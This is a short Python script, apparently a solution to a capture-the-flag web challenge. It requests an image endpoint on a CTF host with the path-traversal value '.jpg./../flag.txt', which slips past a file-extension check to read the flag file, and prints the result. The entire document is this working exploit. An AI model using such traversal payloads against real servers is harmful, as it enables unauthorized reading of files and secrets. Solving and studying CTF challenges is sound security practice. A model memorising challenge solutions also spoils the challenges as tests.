import requests

req = requests.get('https://mikufanpage.web.osugaming.lol/image',
                   params={'path': '.jpg./../flag.txt'})

print(req.text)